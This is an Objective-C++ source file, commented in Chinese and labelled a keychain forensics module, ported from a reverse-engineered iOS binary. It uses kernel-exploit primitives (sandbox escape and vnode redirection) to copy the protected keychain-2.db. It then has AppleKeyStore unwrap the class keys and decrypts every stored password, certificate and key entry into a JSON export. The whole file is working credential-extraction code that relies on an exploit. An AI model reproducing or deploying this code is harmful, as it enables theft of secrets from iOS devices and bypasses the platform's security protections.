//
//  KeychainForensics.mm
//  移植自 FomoPeek / libapptracecore.framework 的 keychain_core.cpp
//
//  对应原二进制位置（libapptracecore）：
//    复制 DB        : 0x5aa760
//    主流程         : 0x584acc
//    metadatakeys   : 0x587d34
//    AKS 客户端     : 0x586928   (IOServiceMatching/Open, selector 0)
//    unwrapKey      : 0x586c44   (selector = 0xb)
//    DecryptCBC     : 0x583ab4   (原为 OpenSSL EVP)
//    KeychainV3     : 0x580360   (AES-CBC + SHA1 tamperCheck)
//    Item 解密      : 0x586f1c
//    表名数组       : 0x6b58a0   -> {"genp","inet","cert","keys"}
//
//  移植改动：
//    1) OpenSSL EVP -> CommonCrypto(CCCryptor*)，SHA1 -> CC_SHA1（工程无 OpenSSL）
//    2) 独立 main() -> ObjC 类方法，供 Swift 调用
//    3) 解密结果 -> NSDictionary / JSON
//
//  依赖：libsqlite3、IOKit、libcopyfile、CommonCrypto
//

#import "KeychainForensics.h"

#import <Foundation/Foundation.h>
#import <CommonCrypto/CommonCryptor.h>
#import <CommonCrypto/CommonDigest.h>

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cerrno>
#include <string>
#include <vector>
#include <map>
#include <stdexcept>

#include <unistd.h>
#include <sqlite3.h>
#include <copyfile.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

// 来自 kexploit：判断沙盒逃逸是否生效（仅用于诊断日志）
// sandbox_escape.m 编译为 C 链接，此处需用 extern "C" 避免 C++ 名字修饰
extern "C" int sandbox_access_is_active(void);

// 来自 kexploit/vnode.m：通过 vnode 重定向读取无权打开的文件（如 keychain-2.db）
// 同样编译为 C 链接，需 extern "C" 避免 C++ 名字修饰
extern "C" int vnode_read_file_via_redirect(const char *target, const char *proxy, const char *dst);

namespace kc {

// ---------------------------------------------------------------------
// 日志：同时输出到 stderr（被应用内 setupLogCapture() 捕获）与沙盒日志文件
// ---------------------------------------------------------------------
static FILE* gLogFile = nullptr;

static void OpenLogFile(const std::string& path) {
    if (gLogFile) { fclose(gLogFile); gLogFile = nullptr; }
    gLogFile = fopen(path.c_str(), "w");
}

static void CloseLogFile(void) {
    if (gLogFile) { fclose(gLogFile); gLogFile = nullptr; }
}

static void Log(const std::string& s) {
    fprintf(stderr, "[keychain] %s\n", s.c_str());
    if (gLogFile) {
        fprintf(gLogFile, "[keychain] %s\n", s.c_str());
        fflush(gLogFile);
    }
}

// =====================================================================
// 1) 复制钥匙串数据库
//    源: /private/var/Keychains/keychain-2.db (+ -shm / -wal)
//    二进制: copyfile(from, to, NULL, COPYFILE_DATA)
// =====================================================================
static const char* kSrcDir   = "/private/var/Keychains/";
static const char* kDbFiles[] = {
    "keychain-2.db", "keychain-2.db-shm", "keychain-2.db-wal"
};

static void CopyKeychainDatabase(const std::string& dstDir) {
    const bool exploitActive = sandbox_access_is_active() == 1;
    Log("copy: uid=" + std::to_string(getuid()) +
        " euid=" + std::to_string(geteuid()) +
        " sandbox_active=" + std::to_string(exploitActive ? 1 : 0));

    // 代理文件：由本进程拥有，仅用于承载一个可被安全改写的 vnode。
    const std::string proxy = dstDir + "/.keychain_redirect_proxy";

    const size_t count = sizeof(kDbFiles) / sizeof(kDbFiles[0]);
    for (size_t i = 0; i < count; i++) {
        const char* f = kDbFiles[i];
        std::string src = std::string(kSrcDir) + f;
        std::string dst = dstDir + "/" + f;

        // 主路径：vnode 重定向。keychain-2.db 属主为 _securityd 且 mode 0600，
        // 即使沙盒逃逸，uid=501 仍会被 POSIX DAC 拒绝（EACCES）；而提权到 root
        // 需要写只读的 zalloc_ro 区域（ucred/proc_ro），socket 写原语会 EFAULT。
        // vnode->v_data 位于可写 kalloc 区，因此改为重定向 v_data 读取。
        int copied = -1;
        if (exploitActive) {
            copied = vnode_read_file_via_redirect(src.c_str(), proxy.c_str(), dst.c_str());
        }

        if (copied > 0) {
            Log("copy: redirected " + src + " -> " + dst +
                " (" + std::to_string(copied) + " bytes)");
            continue;
        }

        // 回退路径：普通 copyfile（仅在以 root 运行或 iOS < 26 时可用）。
        errno = 0;
        if (copyfile(src.c_str(), dst.c_str(), nullptr, COPYFILE_DATA) != 0) {
            int err = errno;
            // keychain-2.db-shm / -wal 是 WAL 辅助文件，不存在时跳过（主库仍可读）
            if (err == ENOENT && i != 0) {
                Log("copy: skipped missing sidecar " + src);
                continue;
            }
            Log("copy failed: " + src + " -> " + dst + " errno=" + std::to_string(err) +
                " (" + std::string(strerror(err)) + ")");
            // 原字符串: "Cannot copy keychain database to temporary folder. Error code: "
            throw std::runtime_error(
                "Cannot copy keychain database to temporary folder. Error code: " +
                std::to_string(err));
        }
    }

    unlink(proxy.c_str());
    Log("Keychain database successfully copied to " + dstDir);
}

// =====================================================================
// 2) AppleKeyStore 客户端
//    把数据库里的 wrapped key 交给内核，用设备 UID key 解包成 AES 密钥
// =====================================================================
class AppleKeyStoreClient {
public:
    bool Open() {
        CFMutableDictionaryRef match = IOServiceMatching("AppleKeyStore");
        service_ = IOServiceGetMatchingService(kIOMainPortDefault, match);
        if (!service_) {
            Log("AppleKeyStore service is not available!");
            return false;
        }
        if (IOServiceOpen(service_, mach_task_self(), 0, &conn_) != KERN_SUCCESS) {
            Log("AppleKeyStore client is not available!");
            return false;
        }
        // selector = 0 : 开启 AKS 会话
        // 注意: IOConnectCallMethod 的 outputCnt/outputStructCnt 类型为 size_t
        uint64_t out = 0; size_t outCnt = 1;
        kern_return_t kr = IOConnectCallMethod(conn_, /*selector=*/0,
                                               nullptr, 0, nullptr, 0,
                                               nullptr, nullptr, &out, &outCnt);
        if (kr != KERN_SUCCESS) {
            Log("Device failed to start AppleKeyStore client with err " + std::to_string(kr));
            return false;
        }
        return true;
    }

    // 输入: 40 字节 wrapped key + keyclass ; 输出: 32 字节 AES 密钥
    // 二进制 0x586c44: input 指针指向 2×uint64 的 keyclass 结构
    std::vector<uint8_t> UnwrapKey(const std::vector<uint8_t>& wrapped, uint32_t keyclass) {
        if (wrapped.size() != 0x28)
            throw std::runtime_error("Invalid wrapped key.");

        uint64_t input[2];
        input[0] = (uint64_t)(keyclass >> 24);
        input[1] = (uint64_t)(keyclass & 0xffffff);

        uint8_t outStruct[48] = {0};
        size_t  outStructCnt  = sizeof(outStruct);

        kern_return_t kr = IOConnectCallMethod(
            conn_, /*selector=*/0xb /* unwrapKey */,
            input, 2,
            wrapped.data(), wrapped.size(),
            nullptr, nullptr,
            outStruct, &outStructCnt);

        if (kr != KERN_SUCCESS) {
            Log("Device failed to unwrap key with keyclass " + std::to_string(keyclass) +
                " err=" + std::to_string(kr));
            return {};
        }
        return std::vector<uint8_t>(outStruct, outStruct + 32);
    }

private:
    io_service_t service_ = 0;
    io_connect_t conn_    = 0;
};

// =====================================================================
// 3) 解密原语
// =====================================================================
// AES-CBC（对应 DecryptCBC @0x583ab4；原为 OpenSSL EVP，此处改用 CommonCrypto）
static std::vector<uint8_t> DecryptCBC(const std::vector<uint8_t>& key,
                                       const std::vector<uint8_t>& iv,
                                       const std::vector<uint8_t>& ciphertext) {
    if (key.size() != 32 && key.size() != 16)
        throw std::runtime_error("DecryptCBC: unexpected keylen");

    CCCryptorRef cryptor = nullptr;
    CCCryptorStatus st = CCCryptorCreate(kCCDecrypt,
                                         kCCAlgorithmAES,
                                         kCCOptionPKCS7Padding,
                                         key.data(), key.size(),
                                         iv.data(),
                                         &cryptor);
    if (st != kCCSuccess)
        throw std::runtime_error("Failed to init decryption algorithm.");

    std::vector<uint8_t> out(ciphertext.size() + kCCBlockSizeAES128);
    size_t moved = 0, total = 0;

    st = CCCryptorUpdate(cryptor, ciphertext.data(), ciphertext.size(),
                         out.data(), out.size(), &moved);
    if (st != kCCSuccess) {
        CCCryptorRelease(cryptor);
        throw std::runtime_error("Can't decrypt data.");
    }
    total = moved;

    st = CCCryptorFinal(cryptor, out.data() + total, out.size() - total, &moved);
    if (st != kCCSuccess) {
        CCCryptorRelease(cryptor);
        throw std::runtime_error("Can't decrypt data.");
    }
    total += moved;
    CCCryptorRelease(cryptor);

    out.resize(total);
    return out;
}

// SHA1 tamperCheck（对应 KeychainV3 @0x580360 尾部 20 字节校验）
static bool VerifyTamperCheck(const std::vector<uint8_t>& decrypted) {
    if (decrypted.size() < 20) return false;
    unsigned char digest[CC_SHA1_DIGEST_LENGTH];
    CC_SHA1(decrypted.data(), (CC_LONG)(decrypted.size() - 20), digest);
    return memcmp(digest, decrypted.data() + decrypted.size() - 20,
                  CC_SHA1_DIGEST_LENGTH) == 0;
}

// =====================================================================
// 4) 极简 protobuf 读取器（SecDbKeychainSerialized* 结构）
// =====================================================================
static bool ReadVarint(const uint8_t* p, const uint8_t* end, uint64_t& v, size_t& n) {
    v = 0; n = 0;
    while (p + n < end) {
        v |= (uint64_t)(p[n] & 0x7f) << (7 * n);
        if (!(p[n] & 0x80)) { n++; return true; }
        n++;
    }
    return false;
}

// 取字段号 field 的 length-delimited 字节
static std::vector<uint8_t> ProtoBytes(const uint8_t* p, const uint8_t* end, int field) {
    while (p < end) {
        uint64_t tag; size_t n;
        if (!ReadVarint(p, end, tag, n)) break;
        p += n;
        int f = (int)(tag >> 3), wt = (int)(tag & 7);
        if (wt == 2) {
            uint64_t len; if (!ReadVarint(p, end, len, n)) break;
            p += n;
            if (p + len > end) break;
            if (f == field) return std::vector<uint8_t>(p, p + len);
            p += len;
        } else if (wt == 0) {
            uint64_t tmp; if (!ReadVarint(p, end, tmp, n)) break;
            p += n;
        } else break;
    }
    return {};
}

// SecDbKeychainSerializedAKSWrappedKey { bytes wrappedKey = 1; }
static std::vector<uint8_t> ParseWrappedKey(const std::vector<uint8_t>& blob) {
    return ProtoBytes(blob.data(), blob.data() + blob.size(), /*field=*/1);
}

// =====================================================================
// 5) 单条 item 解密（对应 0x586f1c，按 blob[0] 版本分派）
// =====================================================================
using KeyMap = std::map<uint32_t, std::vector<uint8_t>>;  // keyclass -> AES key

static std::vector<uint8_t> DecryptItem(const std::vector<uint8_t>& blob, const KeyMap& keys) {
    if (blob.size() < 8)
        throw std::runtime_error("KeychainV9 blob is too small to be valid!");

    uint8_t  version  = blob[0];
    uint32_t keyclass = 0;
    memcpy(&keyclass, blob.data() + 4, sizeof(keyclass));

    auto it = keys.find(keyclass);
    if (it == keys.end()) {
        Log("[WARNING] Metadata wrapping key of keyclass " + std::to_string(keyclass) +
            " is unavailable.");
        return {};
    }
    const std::vector<uint8_t>& key = it->second;

    if (version == 7 || version == 8) {
        // V7/V8: 8 字节头之后为 protobuf(SecDbKeychainSerializedItemV7)，
        // secretData 内含 IV + ciphertext。
        auto secret = ProtoBytes(blob.data() + 8, blob.data() + blob.size(), /*field=*/1);
        if (secret.size() < 16)
            throw std::runtime_error("KeychainV7 blob is too small to be valid!");
        std::vector<uint8_t> iv(secret.begin(), secret.begin() + 16);
        std::vector<uint8_t> ct(secret.begin() + 16, secret.end());
        return DecryptCBC(key, iv, ct);
    }

    if (version <= 1) {
        // V0/V1: 40 字节头 + AES-CBC 密文
        if (blob.size() < 0x28)
            throw std::runtime_error("KeychainV9 blob is too small to be valid!");
        std::vector<uint8_t> iv(16, 0);
        std::vector<uint8_t> ct(blob.begin() + 0x28, blob.end());
        if (ct.size() % 16 != 0)
            throw std::runtime_error("ItemV0/V1 bad CBC ciphertext size: " +
                                     std::to_string(ct.size()));
        return DecryptCBC(key, iv, ct);
    }

    throw std::runtime_error("Unknown item version: " + std::to_string(version));
}

// KeychainV3 blob: 前 16 字节 IV + AES-CBC 密文，明文尾部 20 字节为 SHA1 tamperCheck
[[maybe_unused]] static std::vector<uint8_t> DecryptKeychainV3(const std::vector<uint8_t>& blob,
                                                               const std::vector<uint8_t>& key) {
    if (blob.size() < 0x30 || blob.size() % 16 != 0)
        throw std::runtime_error("KeychainV3 blob is too small to be valid!");

    std::vector<uint8_t> iv(blob.begin(), blob.begin() + 16);
    std::vector<uint8_t> ct(blob.begin() + 16, blob.end());
    std::vector<uint8_t> plain = DecryptCBC(key, iv, ct);

    if (!VerifyTamperCheck(plain))
        throw std::runtime_error("Bad decryption of KeychainV3 blob (sha1 mismatch)");

    plain.resize(plain.size() - 20);   // 去掉 20 字节 tamperCheck
    return plain;
}

// =====================================================================
// 6) 主流程（对应 0x584acc）
// =====================================================================
static const char* kTables[] = { "genp", "inet", "cert", "keys" };  // @0x6b58a0

using DumpResult = std::map<std::string, std::vector<std::vector<uint8_t>>>;

static DumpResult DumpKeychain(const std::string& dbPath) {
    DumpResult result;

    sqlite3* db = nullptr;
    if (sqlite3_open_v2(dbPath.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK)
        throw std::runtime_error("Cannot open keychain database.");

    // --- 版本判定: SELECT version FROM tversion ---
    int version = 0;
    {
        sqlite3_stmt* st = nullptr;
        if (sqlite3_prepare_v2(db, "SELECT version FROM tversion", -1, &st, nullptr) == SQLITE_OK
            && sqlite3_step(st) == SQLITE_ROW) {
            version = sqlite3_column_int(st, 0);
        }
        sqlite3_finalize(st);
    }
    if (version > 0xc)
        throw std::runtime_error("Unsupported keychain database version.");
    Log("Keychain database version: " + std::to_string(version));

    // --- 建立 AKS 客户端 ---
    AppleKeyStoreClient aks;
    if (!aks.Open())
        throw std::runtime_error("AppleKeyStore client is not available!");

    // --- 解包 metadatakeys: keyclass -> metadata key ---
    KeyMap metadataKeys;
    {
        sqlite3_stmt* st = nullptr;
        sqlite3_prepare_v2(db, "SELECT keyclass, data FROM metadatakeys", -1, &st, nullptr);
        while (sqlite3_step(st) == SQLITE_ROW) {
            uint32_t keyclass = (uint32_t)sqlite3_column_int(st, 0);
            const void* blob  = sqlite3_column_blob(st, 1);
            int n             = sqlite3_column_bytes(st, 1);
            if (!blob || n <= 0) continue;

            std::vector<uint8_t> data((const uint8_t*)blob, (const uint8_t*)blob + n);
            std::vector<uint8_t> wrapped = ParseWrappedKey(data);            // 40 字节
            std::vector<uint8_t> key     = aks.UnwrapKey(wrapped, keyclass); // 32 字节
            if (!key.empty()) metadataKeys[keyclass] = key;
        }
        sqlite3_finalize(st);
    }

    // --- 逐表逐行: SELECT rowid, data FROM <table> ---
    for (const char* table : kTables) {
        Log(std::string("Decrypting table ") + table);
        std::string sql = std::string("SELECT rowid, data FROM ") + table;

        sqlite3_stmt* st = nullptr;
        if (sqlite3_prepare_v2(db, sql.c_str(), -1, &st, nullptr) != SQLITE_OK) continue;

        while (sqlite3_step(st) == SQLITE_ROW) {
            int64_t rowid    = sqlite3_column_int64(st, 0);
            const void* blob = sqlite3_column_blob(st, 1);
            int n            = sqlite3_column_bytes(st, 1);
            if (!blob || n <= 0) continue;

            Log("Decrypting rowId " + std::to_string(rowid));
            std::vector<uint8_t> item((const uint8_t*)blob, (const uint8_t*)blob + n);
            try {
                std::vector<uint8_t> plain = DecryptItem(item, metadataKeys);
                if (!plain.empty()) result[table].push_back(plain);
            } catch (const std::exception& e) {
                Log(std::string("decrypt failed: ") + e.what());
            }
        }
        sqlite3_finalize(st);
    }

    sqlite3_close(db);
    return result;
}

} // namespace kc

// =====================================================================
// ObjC 桥接：把解密结果转成 Foundation 对象
// =====================================================================
// 沙盒内日志文件路径（Documents，已开启 UIFileSharingEnabled，可经「文件」App 查看）
static NSString *KCLogFilePath(void) {
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                                    NSUserDomainMask, YES);
    NSString *base = docs.firstObject ?: NSTemporaryDirectory();
    return [base stringByAppendingPathComponent:@"keychain-forensics.log"];
}

static id KCSanitizeForJSON(id obj) {
    if (obj == nil) return [NSNull null];
    if ([obj isKindOfClass:[NSData class]])
        return [(NSData *)obj base64EncodedStringWithOptions:0];
    if ([obj isKindOfClass:[NSArray class]]) {
        NSMutableArray *arr = [NSMutableArray array];
        for (id v in (NSArray *)obj) [arr addObject:KCSanitizeForJSON(v)];
        return arr;
    }
    if ([obj isKindOfClass:[NSDictionary class]]) {
        NSMutableDictionary *dict = [NSMutableDictionary dictionary];
        for (id k in (NSDictionary *)obj) dict[[k description]] = KCSanitizeForJSON(((NSDictionary *)obj)[k]);
        return dict;
    }
    if ([obj isKindOfClass:[NSString class]] ||
        [obj isKindOfClass:[NSNumber class]] ||
        [obj isKindOfClass:[NSNull class]])
        return obj;
    return [obj description];
}

// 单条明文：优先按 binary plist 解析（v_Data / v_Account / v_Service ...），否则 base64
static id KCDecodeItem(const std::vector<uint8_t>& plain) {
    NSData *data = [NSData dataWithBytes:plain.data() length:plain.size()];
    NSError *plistError = nil;
    id plist = [NSPropertyListSerialization propertyListWithData:data
                                                         options:0
                                                          format:NULL
                                                           error:&plistError];
    if (plist && [plist isKindOfClass:[NSDictionary class]])
        return KCSanitizeForJSON(plist);

    return @{ @"base64": [data base64EncodedStringWithOptions:0],
              @"length": @(plain.size()) };
}

@implementation KeychainForensics

+ (NSArray<NSDictionary<NSString *, id> *> *)dumpKeychainWithError:(NSError **)error {
    NSString *logPath = KCLogFilePath();
    kc::OpenLogFile(std::string(logPath.UTF8String));
    kc::Log("keychain forensics started (log: " + std::string(logPath.UTF8String) + ")");

    try {
        NSString *tmpDir = [NSTemporaryDirectory() stringByAppendingPathComponent:@"Acquisition-FomoPeek"];
        [[NSFileManager defaultManager] createDirectoryAtPath:tmpDir
                                  withIntermediateDirectories:YES
                                                   attributes:nil
                                                        error:nil];
        std::string dstDir = std::string(tmpDir.UTF8String);

        kc::CopyKeychainDatabase(dstDir);
        kc::DumpResult tables = kc::DumpKeychain(dstDir + "/keychain-2.db");

        NSMutableArray *result = [NSMutableArray array];
        NSUInteger total = 0;
        for (const auto& kv : tables) {
            NSMutableArray *items = [NSMutableArray array];
            for (const auto& plain : kv.second) [items addObject:KCDecodeItem(plain)];
            total += items.count;
            [result addObject:@{
                @"table": [NSString stringWithUTF8String:kv.first.c_str()],
                @"count": @(items.count),
                @"items": items,
            }];
        }
        kc::Log("dump finished: " + std::to_string(result.count) + " tables, " +
                std::to_string(total) + " items");
        kc::CloseLogFile();
        return result;
    } catch (const std::exception& e) {
        kc::Log(std::string("dump failed: ") + e.what());
        if (error) {
            *error = [NSError errorWithDomain:@"KeychainForensics"
                                         code:1
                                     userInfo:@{ NSLocalizedDescriptionKey:
                                                     [NSString stringWithUTF8String:e.what()] }];
        }
        kc::CloseLogFile();
        return nil;
    }
}

+ (NSString *)exportKeychainToDirectory:(NSString *)directory error:(NSError **)error {
    NSArray<NSDictionary<NSString *, id> *> *dump = [self dumpKeychainWithError:error];
    if (!dump) return nil;

    NSData *json = [NSJSONSerialization dataWithJSONObject:dump
                                                   options:NSJSONWritingPrettyPrinted
                                                     error:error];
    if (!json) return nil;

    NSString *path = [directory stringByAppendingPathComponent:@"keychain-forensics.json"];
    if (![json writeToFile:path atomically:YES]) {
        if (error) {
            *error = [NSError errorWithDomain:@"KeychainForensics"
                                         code:2
                                     userInfo:@{ NSLocalizedDescriptionKey:
                                                     @"Failed to write keychain-forensics.json" }];
        }
        return nil;
    }
    kc::Log("keychain export written to " + std::string(path.UTF8String));
    return path;
}

+ (NSString *)logFilePath {
    return KCLogFilePath();
}

@end
